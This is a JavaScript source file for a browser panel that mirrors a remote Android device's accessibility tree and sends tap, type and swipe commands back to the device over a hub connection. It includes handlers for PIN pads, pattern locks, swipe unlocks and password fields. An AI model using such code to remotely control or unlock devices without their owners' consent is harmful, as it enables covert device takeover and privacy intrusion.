'use strict';
/**
 * LyReader v2 — Accessibility-tree screen reader for Ly panel
 *
 * Receives the accessibility node tree from the APK (screen_hierarchy JSON),
 * renders it as an interactive scaled div tree, and maps all interactions
 * back to normalized [0–1] device coordinates → TAP / TYPE / SWIPE commands.
 *
 * Node JSON shape (from UiAssistBridge.buildNodeTree):
 *   {
 *     class, text, desc, hint, id,
 *     clickable, editable, password, checked, enabled,
 *     focused, scrollable, longClickable, selected,
 *     isKeyboard, isKeyboardKey, keyType,
 *     isLockElement, isPinDigit, isPatternLock, isSwipeUnlock,
 *     patternGrid: [{x,y,r}], swipeHint: {sx,sy,ex,ey},
 *     bounds: {x, y, w, h},   ← absolute device pixels
 *     children: [...]
 *   }
 * Root:
 *   { hierarchy: { class:'RootView', bounds:{x,y,w,h}, children:[...] }, ... }
 */

class LyReader {
  /**
   * @param {HTMLElement} container  — element to render inside (fills it 100%)
   * @param {string}      deviceId
   * @param {Function}    sendFn     — sendFn(obj) sends a WS message to hub
   * @param {number}      screenW    — device screen width  in px (e.g. 1080)
   * @param {number}      screenH    — device screen height in px (e.g. 1920)
   */
  constructor(container, deviceId, sendFn, screenW = 1080, screenH = 1920) {
    this._container = container;
    this._deviceId  = deviceId;
    this._send      = sendFn;
    this._screenW   = screenW;
    this._screenH   = screenH;

    // Rendering state
    this._root      = null;   // current hierarchy root node
    this._nodes     = [];     // flat list of rendered node objects
    this._focused   = null;   // currently focused editable node
    this._refreshTimer = null;
    this._pollTimer    = null;
    this._polling      = false;

    // Pattern lock drag state
    this._patternDrag  = false;
    this._patternSVG   = null;
    this._patternPath  = [];   // [{x,y}] pixel path on device

    // Build skeleton
    this._build();
  }

  // ── Build DOM skeleton ───────────────────────────────────────────────────────
  _build() {
    this._container.style.cssText = `
      position:relative; width:100%; height:100%;
      overflow:hidden; background:#050510;
      font-family:'Segoe UI',system-ui,sans-serif;
      cursor:default; user-select:none;
    `;

    // Placeholder shown before first hierarchy arrives
    this._placeholder = document.createElement('div');
    this._placeholder.style.cssText = `
      position:absolute; inset:0; display:flex;
      flex-direction:column; align-items:center; justify-content:center;
      color:#1e1e38; font-size:13px; font-weight:600; letter-spacing:.5px;
      pointer-events:none;
    `;
    this._placeholder.innerHTML = `
      <div style="font-size:36px;margin-bottom:12px">📱</div>
      <div>Ly Screen Reader</div>
      <div style="font-size:10px;margin-top:6px;color:#111130">Press START — awaiting hierarchy</div>`;
    this._container.appendChild(this._placeholder);

    // Status bar
    this._statusBar = document.createElement('div');
    this._statusBar.style.cssText = `
      position:absolute; top:0; left:0; right:0; height:20px;
      background:rgba(5,5,18,0.9); border-bottom:1px solid #111128;
      display:flex; align-items:center; padding:0 8px; gap:8px;
      font-size:9px; color:#2a2a50; z-index:9999; pointer-events:none;
    `;
    this._statusBar.innerHTML = `
      <span id="_lyr_pkg" style="color:#3a3a6a"></span>
      <span style="flex:1"></span>
      <span id="_lyr_cnt" style="color:#1a1a35">0 nodes</span>
      <span id="_lyr_dim" style="color:#111128"></span>`;
    this._container.appendChild(this._statusBar);

    // Tree layer — all nodes rendered here
    this._layer = document.createElement('div');
    this._layer.style.cssText = 'position:absolute; inset:0; overflow:hidden;';
    this._container.appendChild(this._layer);

    // Hidden real input for capturing keyboard on focused editable nodes
    this._realInput = document.createElement('input');
    this._realInput.type = 'text';
    this._realInput.autocomplete = 'off';
    this._realInput.autocorrect = 'off';
    this._realInput.spellcheck = false;
    this._realInput.style.cssText = `
      position:absolute; left:-9999px; top:0;
      width:1px; height:1px; opacity:0; pointer-events:none;
    `;
    this._container.appendChild(this._realInput);
    this._bindRealInput();

    // Global keyboard handler on container
    this._container.tabIndex = 0;
    this._container.addEventListener('keydown', e => this._onKeydown(e));
  }

  // ── Public API ───────────────────────────────────────────────────────────────

  /** Feed new hierarchy JSON (the full message or just the hierarchy object). */
  update(data) {
    let hier;
    if (typeof data === 'string') {
      try { data = JSON.parse(data); } catch { return; }
    }
    hier = data?.hierarchy || data;
    if (!hier) return;

    this._root = hier;
    const rootBounds = hier.bounds || {};
    if (rootBounds.w > 0) this._screenW = rootBounds.w;
    if (rootBounds.h > 0) this._screenH = rootBounds.h;

    this._placeholder.style.display = 'none';
    this._render(hier);
    this._updateStatus(hier);
  }

  /** Start continuous client-side hierarchy polling. */
  startPolling(intervalMs = 700) {
    if (this._polling) return;
    this._polling = true;
    this._requestHierarchy();                        // fire immediately
    this._pollTimer = setInterval(() => {
      if (this._polling) this._requestHierarchy();
    }, intervalMs);
  }

  /** Stop polling. */
  stopPolling() {
    if (!this._polling) return;
    this._polling = false;
    clearInterval(this._pollTimer);
    this._pollTimer = null;
    clearTimeout(this._refreshTimer);
  }

  /** Clean up everything. */
  destroy() {
    this.stopPolling();
    clearTimeout(this._refreshTimer);
    this._container.innerHTML = '';
  }

  // ── Rendering ────────────────────────────────────────────────────────────────

  _render(root) {
    // Compute scale to fit device screen into container
    const cw = this._container.clientWidth  || 360;
    const ch = this._container.clientHeight || 720;
    const sw = this._screenW || 1080;
    const sh = this._screenH || 1920;

    // Keep aspect ratio, center the view
    const scale = Math.min(cw / sw, ch / sh);
    const ox = (cw - sw * scale) / 2;
    const oy = (ch - sh * scale) / 2;

    this._layer.innerHTML = '';
    this._nodes = [];
    this._focused = null;

    // Background phone outline
    const phone = document.createElement('div');
    phone.style.cssText = `
      position:absolute;
      left:${ox}px; top:${oy}px;
      width:${sw * scale}px; height:${sh * scale}px;
      background:#080818; border:1px solid #141430;
      border-radius:8px; overflow:hidden;
    `;
    this._layer.appendChild(phone);

    this._scaleX = scale;
    this._scaleY = scale;
    this._offsetX = ox;
    this._offsetY = oy;

    // Walk tree
    this._walkNode(root, phone, scale, ox, oy, sw, sh);

    // Update dim display
    const dim = this._container.querySelector('#_lyr_dim');
    if (dim) dim.textContent = `${sw}×${sh}`;
  }

  _walkNode(node, parent, scale, ox, oy, sw, sh) {
    if (!node) return;

    const b = node.bounds;
    if (!b || b.w <= 0 || b.h <= 0) {
      // Still recurse into children even if this node has no visible bounds
      const children = node.children || [];
      for (const child of children) this._walkNode(child, parent, scale, ox, oy, sw, sh);
      return;
    }

    // Skip nodes that are fully outside the screen
    if (b.x + b.w < 0 || b.y + b.h < 0 || b.x > sw || b.y > sh) {
      return;
    }

    const el = this._buildNodeEl(node, b, scale, ox, oy, sw, sh);
    if (el) {
      parent.appendChild(el);
      // Recurse into children inside this el
      const children = node.children || [];
      for (const child of children) this._walkNode(child, el, scale, 0, 0, sw, sh);
    }
  }

  _buildNodeEl(node, b, scale, ox, oy, sw, sh) {
    const cls = (node.class || '').toLowerCase();

    // ── Pattern lock ─────────────────────────────────────────────────────────
    if (node.isPatternLock && node.patternGrid) {
      return this._buildPatternLock(node, b, scale, ox, oy, sw, sh);
    }

    // ── Swipe unlock ─────────────────────────────────────────────────────────
    if (node.isSwipeUnlock && node.swipeHint) {
      return this._buildSwipeUnlock(node, b, scale, ox, oy, sw, sh);
    }

    // ── Keyboard key ─────────────────────────────────────────────────────────
    if (node.isKeyboardKey || node.isKeyboard) {
      return this._buildKeyboardKey(node, b, scale, ox, oy, sw, sh);
    }

    // ── Decide element type ───────────────────────────────────────────────────
    const div = document.createElement('div');

    // Position relative to parent (parent already accounts for offset)
    div.style.cssText = `
      position:absolute;
      left:${(b.x * scale + ox)}px; top:${(b.y * scale + oy)}px;
      width:${b.w * scale}px; height:${b.h * scale}px;
      box-sizing:border-box; overflow:hidden;
    `;

    const displayText = node.text || node.desc || node.hint || '';
    const isEditable  = node.editable;
    const isClickable = node.clickable && !isEditable;
    const isPinDigit  = node.isPinDigit;
    const isChecked   = node.checked;
    const isScrollable = node.scrollable;
    const isEnabled   = node.enabled !== false;

    // ── Editable field ────────────────────────────────────────────────────────
    if (isEditable) {
      div.style.border        = node.focused ? '1.5px solid #7c6af7' : '1px solid #2a2a50';
      div.style.background    = 'rgba(14,14,30,0.85)';
      div.style.borderRadius  = '4px';
      div.style.cursor        = 'text';
      div.style.display       = 'flex';
      div.style.alignItems    = 'center';
      div.style.padding       = '0 4px';

      const inner = document.createElement('div');
      inner.style.cssText = `
        width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
        font-size:${Math.max(9, Math.min(14, b.h * scale * 0.45))}px;
        color:${displayText ? '#ccc' : '#333355'};
      `;
      inner.textContent = node.focused
        ? (displayText || '|')
        : (displayText || (node.hint ? node.hint : ''));
      if (node.password && displayText)
        inner.textContent = '•'.repeat(displayText.length);

      div.appendChild(inner);

      div.addEventListener('click', e => {
        e.stopPropagation();
        this._tapNode(node, sw, sh);
        this._setFocused(node, div, inner);
      });

      this._nodes.push({ node, el: div, inner });
    }

    // ── PIN digit ─────────────────────────────────────────────────────────────
    else if (isPinDigit) {
      div.style.background   = 'rgba(20,20,45,0.9)';
      div.style.border       = '1px solid #2a2a50';
      div.style.borderRadius = '50%';
      div.style.display      = 'flex';
      div.style.alignItems   = 'center';
      div.style.justifyContent = 'center';
      div.style.cursor       = 'pointer';
      div.style.fontSize     = `${Math.max(10, b.h * scale * 0.5)}px`;
      div.style.fontWeight   = '700';
      div.style.color        = '#ccc';
      div.textContent        = displayText;
      this._addTapBehavior(div, node, sw, sh);
    }

    // ── Clickable (button, link, etc.) ────────────────────────────────────────
    else if (isClickable) {
      const hasText = displayText.length > 0;

      if (hasText) {
        // Determine if it looks like a primary button
        const isPrimary = cls.includes('button') || cls.includes('btn');
        div.style.background   = isPrimary
          ? 'rgba(124,106,247,0.15)' : 'transparent';
        div.style.border       = isPrimary
          ? '1px solid rgba(124,106,247,0.5)' : 'none';
        div.style.borderRadius = '4px';
        div.style.display      = 'flex';
        div.style.alignItems   = 'center';
        div.style.justifyContent = 'center';
        div.style.cursor       = isEnabled ? 'pointer' : 'default';
        div.style.opacity      = isEnabled ? '1' : '0.4';

        const lbl = document.createElement('div');
        lbl.style.cssText = `
          font-size:${Math.max(8, Math.min(13, b.h * scale * 0.42))}px;
          font-weight:600; color:#9090cc;
          overflow:hidden; text-overflow:ellipsis;
          white-space:nowrap; padding:0 3px; text-align:center;
        `;
        lbl.textContent = displayText;
        div.appendChild(lbl);
      } else {
        // Clickable with no text — just a subtle tap target overlay
        div.style.background = 'transparent';
        div.style.cursor     = isEnabled ? 'pointer' : 'default';
      }

      if (isEnabled) this._addTapBehavior(div, node, sw, sh);
    }

    // ── TextView (non-clickable, has text) ────────────────────────────────────
    else if (displayText && !isEditable) {
      div.style.display        = 'flex';
      div.style.alignItems     = 'center';
      div.style.overflow       = 'hidden';
      div.style.padding        = '0 2px';

      const lbl = document.createElement('div');
      lbl.style.cssText = `
        font-size:${Math.max(7, Math.min(14, b.h * scale * 0.45))}px;
        color:#55557a; overflow:hidden; text-overflow:ellipsis;
        white-space:nowrap; width:100%;
      `;
      lbl.textContent = displayText;
      div.appendChild(lbl);
    }

    // ── Scrollable container hint ─────────────────────────────────────────────
    if (isScrollable) {
      div.style.outline = '1px dashed rgba(60,60,120,0.3)';
      this._addScrollBehavior(div, node, sw, sh);
    }

    // ── Checked state ─────────────────────────────────────────────────────────
    if (isChecked) {
      div.style.outline = '1px solid rgba(61,186,122,0.4)';
    }

    // ── Focused state (without editable) ──────────────────────────────────────
    if (node.focused && !isEditable) {
      div.style.outline = '1.5px solid rgba(124,106,247,0.5)';
    }

    return div;
  }

  // ── Keyboard key rendering ───────────────────────────────────────────────────
  _buildKeyboardKey(node, b, scale, ox, oy, sw, sh) {
    const div = document.createElement('div');
    div.style.cssText = `
      position:absolute;
      left:${b.x * scale + ox}px; top:${b.y * scale + oy}px;
      width:${b.w * scale}px; height:${b.h * scale}px;
      background:rgba(20,20,45,0.7);
      border:1px solid #111130;
      border-radius:${Math.max(2, b.w * scale * 0.08)}px;
      display:flex; align-items:center; justify-content:center;
      cursor:pointer; box-sizing:border-box; overflow:hidden;
    `;

    const label = node.text || node.desc || '';
    if (label) {
      const lbl = document.createElement('div');
      lbl.style.cssText = `
        font-size:${Math.max(7, Math.min(13, b.h * scale * 0.55))}px;
        color:#6060aa; font-weight:500; text-align:center;
        pointer-events:none; overflow:hidden;
      `;
      lbl.textContent = label.length <= 3 ? label : label.slice(0, 3);
      div.appendChild(lbl);
    }

    // Tap behavior
    div.addEventListener('mousedown', () => {
      div.style.background = 'rgba(40,40,80,0.9)';
      div.style.color      = '#9090dd';
    });
    div.addEventListener('mouseup', () => {
      div.style.background = 'rgba(20,20,45,0.7)';
      this._tapNode(node, sw, sh);
    });
    div.addEventListener('mouseleave', () => {
      div.style.background = 'rgba(20,20,45,0.7)';
    });

    return div;
  }

  // ── Pattern lock ─────────────────────────────────────────────────────────────
  _buildPatternLock(node, b, scale, ox, oy, sw, sh) {
    const div = document.createElement('div');
    const px  = b.x * scale + ox;
    const py  = b.y * scale + oy;
    const pw  = b.w * scale;
    const ph  = b.h * scale;

    div.style.cssText = `
      position:absolute; left:${px}px; top:${py}px;
      width:${pw}px; height:${ph}px;
      cursor:crosshair;
    `;

    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('width', pw);
    svg.setAttribute('height', ph);
    svg.style.cssText = 'position:absolute;inset:0;overflow:visible;';
    this._patternSVG = svg;

    // Draw grid dots
    const grid = node.patternGrid || [];
    const dotEls = [];

    for (const pt of grid) {
      const cx = (pt.x - b.x) * scale;
      const cy = (pt.y - b.y) * scale;
      const r  = Math.max(4, (pt.r || 20) * scale);

      const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
      circle.setAttribute('cx', cx);
      circle.setAttribute('cy', cy);
      circle.setAttribute('r', r);
      circle.setAttribute('fill', 'rgba(80,80,160,0.3)');
      circle.setAttribute('stroke', '#3a3a70');
      circle.setAttribute('stroke-width', '1');
      svg.appendChild(circle);

      dotEls.push({ el: circle, px: pt.x, py: pt.y, cx, cy });
    }

    // Path line
    const pathEl = document.createElementNS('http://www.w3.org/2000/svg', 'polyline');
    pathEl.setAttribute('fill', 'none');
    pathEl.setAttribute('stroke', 'rgba(124,106,247,0.7)');
    pathEl.setAttribute('stroke-width', '2');
    pathEl.setAttribute('stroke-linecap', 'round');
    svg.appendChild(pathEl);

    div.appendChild(svg);

    // Drag logic
    let dragging = false;
    let patternPath = [];     // device pixel coords for swipe

    const hitTest = (ex, ey) => {
      const rect = div.getBoundingClientRect();
      const lx = ex - rect.left;
      const ly = ey - rect.top;
      for (const d of dotEls) {
        const dist = Math.hypot(lx - d.cx, ly - d.cy);
        if (dist < 24 && !patternPath.find(p => p.x === d.px && p.y === d.py)) {
          return d;
        }
      }
      return null;
    };

    div.addEventListener('mousedown', e => {
      dragging = true;
      patternPath = [];
      pathEl.setAttribute('points', '');
      dotEls.forEach(d => {
        d.el.setAttribute('fill', 'rgba(80,80,160,0.3)');
        d.el.setAttribute('stroke', '#3a3a70');
      });
      const hit = hitTest(e.clientX, e.clientY);
      if (hit) {
        patternPath.push({ x: hit.px, y: hit.py });
        hit.el.setAttribute('fill', 'rgba(124,106,247,0.5)');
        hit.el.setAttribute('stroke', '#7c6af7');
      }
      e.preventDefault();
    });

    window.addEventListener('mousemove', e => {
      if (!dragging) return;
      const hit = hitTest(e.clientX, e.clientY);
      if (hit) {
        patternPath.push({ x: hit.px, y: hit.py });
        hit.el.setAttribute('fill', 'rgba(124,106,247,0.5)');
        hit.el.setAttribute('stroke', '#7c6af7');
        // Update line
        const pts = patternPath.map(p => {
          const d = dotEls.find(dd => dd.px === p.x && dd.py === p.y);
          return d ? `${d.cx},${d.cy}` : '';
        }).join(' ');
        pathEl.setAttribute('points', pts);
      }
    });

    window.addEventListener('mouseup', () => {
      if (!dragging) return;
      dragging = false;
      if (patternPath.length >= 2) {
        // Send swipe chain: swipe from each dot to next
        for (let i = 0; i < patternPath.length - 1; i++) {
          const p1 = patternPath[i];
          const p2 = patternPath[i + 1];
          const delay = i * 120;
          setTimeout(() => {
            this._send({ type: 'cmd', target: this._deviceId, cmd: 'SWIPE', args: {
              x1: p1.x / sw, y1: p1.y / sh,
              x2: p2.x / sw, y2: p2.y / sh,
              duration: 100,
            }});
          }, delay);
        }
        this._scheduleRefresh(600 + patternPath.length * 120);
      }
    });

    return div;
  }

  // ── Swipe unlock ──────────────────────────────────────────────────────────────
  _buildSwipeUnlock(node, b, scale, ox, oy, sw, sh) {
    const div = document.createElement('div');
    div.style.cssText = `
      position:absolute;
      left:${b.x * scale + ox}px; top:${b.y * scale + oy}px;
      width:${b.w * scale}px; height:${b.h * scale}px;
      background:rgba(30,30,60,0.3); border:1px dashed #2a2a55;
      border-radius:8px; display:flex; align-items:center;
      justify-content:center; cursor:ns-resize;
    `;

    const lbl = document.createElement('div');
    lbl.style.cssText = 'font-size:10px;color:#3a3a6a;pointer-events:none;';
    lbl.textContent = '↑ Swipe to unlock';
    div.appendChild(lbl);

    div.addEventListener('click', () => {
      const hint = node.swipeHint;
      this._send({ type: 'cmd', target: this._deviceId, cmd: 'SWIPE', args: {
        x1: hint.sx / sw, y1: hint.sy / sh,
        x2: hint.ex / sw, y2: hint.ey / sh,
        duration: 300,
      }});
      this._scheduleRefresh(500);
    });

    return div;
  }

  // ── Interaction helpers ───────────────────────────────────────────────────────

  _addTapBehavior(div, node, sw, sh) {
    div.addEventListener('mousedown', () => {
      div.style.filter = 'brightness(1.4)';
    });
    div.addEventListener('mouseup', () => {
      div.style.filter = '';
      this._tapNode(node, sw, sh);
    });
    div.addEventListener('mouseleave', () => {
      div.style.filter = '';
    });

    // Touch
    div.addEventListener('touchstart', e => {
      e.preventDefault();
      div.style.filter = 'brightness(1.4)';
    }, { passive: false });
    div.addEventListener('touchend', e => {
      e.preventDefault();
      div.style.filter = '';
      this._tapNode(node, sw, sh);
    }, { passive: false });
  }

  _addScrollBehavior(div, node, sw, sh) {
    div.addEventListener('wheel', e => {
      e.stopPropagation();
      const b   = node.bounds;
      const cx  = (b.x + b.w / 2) / sw;
      const cy  = (b.y + b.h / 2) / sh;
      const delta = e.deltaY > 0 ? 0.25 : -0.25;
      this._send({ type: 'cmd', target: this._deviceId, cmd: 'SWIPE', args: {
        x1: cx, y1: cy,
        x2: cx, y2: Math.max(0.01, Math.min(0.99, cy - delta)),
        duration: 250,
      }});
      this._scheduleRefresh(400);
    }, { passive: true });
  }

  _tapNode(node, sw, sh) {
    const b  = node.bounds;
    const cx = (b.x + b.w / 2) / sw;
    const cy = (b.y + b.h / 2) / sh;
    this._send({ type: 'cmd', target: this._deviceId, cmd: 'TAP', args: {
      x: Math.max(0, Math.min(1, cx)),
      y: Math.max(0, Math.min(1, cy)),
    }});
    this._scheduleRefresh(400);
  }

  _setFocused(node, divEl, innerEl) {
    // Un-highlight previous
    if (this._focused && this._focused.el !== divEl) {
      this._focused.el.style.border = '1px solid #2a2a50';
    }
    this._focused = { node, el: divEl, inner: innerEl };
    divEl.style.border = '1.5px solid #7c6af7';
    // Pull focus to hidden input to receive keyboard
    this._realInput.value = '';
    this._realInput.focus();
  }

  _bindRealInput() {
    // Every keystroke on the real input gets forwarded as TYPE
    this._realInput.addEventListener('input', () => {
      const val = this._realInput.value;
      if (!val) return;
      this._realInput.value = '';
      if (this._focused) {
        // Update visual feedback
        const cur = this._focused.inner.textContent;
        this._focused.inner.textContent = cur + val;
        this._focused.inner.style.color = '#ccc';
      }
      this._send({ type: 'cmd', target: this._deviceId, cmd: 'TYPE', args: { text: val } });
      this._scheduleRefresh(600);
    });

    this._realInput.addEventListener('keydown', e => {
      if (e.key === 'Backspace') {
        e.preventDefault();
        if (this._focused) {
          const cur = this._focused.inner.textContent;
          this._focused.inner.textContent = cur.slice(0, -1);
        }
        this._send({ type: 'cmd', target: this._deviceId, cmd: 'TYPE', args: { text: '\b' } });
        this._scheduleRefresh(500);
      }
      if (e.key === 'Enter') {
        e.preventDefault();
        this._send({ type: 'cmd', target: this._deviceId, cmd: 'TYPE', args: { text: '\n' } });
        this._scheduleRefresh(500);
      }
    });
  }

  _onKeydown(e) {
    // Container-level keyboard: if no focused input, send keystrokes directly
    if (this._focused) return; // handled by realInput
    if (e.ctrlKey || e.metaKey) return;
    if (e.key.length === 1) {
      this._send({ type: 'cmd', target: this._deviceId, cmd: 'TYPE', args: { text: e.key } });
      this._scheduleRefresh(500);
    }
  }

  // ── Refresh scheduling ────────────────────────────────────────────────────────

  /** Schedule a hierarchy refresh after Nms (debounced). */
  _scheduleRefresh(ms = 400) {
    clearTimeout(this._refreshTimer);
    this._refreshTimer = setTimeout(() => {
      this._requestHierarchy();
    }, ms);
  }

  _requestHierarchy() {
    // Standard cmd path — same format the original Hier button uses,
    // works with every hub version without any server changes.
    this._send({ type: 'cmd', target: this._deviceId, cmd: 'REQUEST_HIERARCHY', args: {} });
  }

  // ── Status bar ────────────────────────────────────────────────────────────────

  _updateStatus(root) {
    let nodeCount = 0;
    const countNodes = n => {
      if (!n) return;
      nodeCount++;
      for (const c of (n.children || [])) countNodes(c);
    };
    countNodes(root);

    // Find package from deepest child with id
    let pkg = '';
    const findPkg = n => {
      if (n?.id && n.id.includes(':id/')) {
        pkg = n.id.split(':id/')[0];
      }
      for (const c of (n?.children || [])) findPkg(c);
    };
    findPkg(root);

    const pkgEl = this._container.querySelector('#_lyr_pkg');
    const cntEl = this._container.querySelector('#_lyr_cnt');
    if (pkgEl) pkgEl.textContent = pkg ? pkg.split('.').pop() : '';
    if (cntEl) cntEl.textContent = `${nodeCount} nodes`;
  }

  // ── Resize ────────────────────────────────────────────────────────────────────

  /** Call this if the container resizes (e.g. window resize). */
  onResize() {
    if (this._root) this._render(this._root);
  }
}
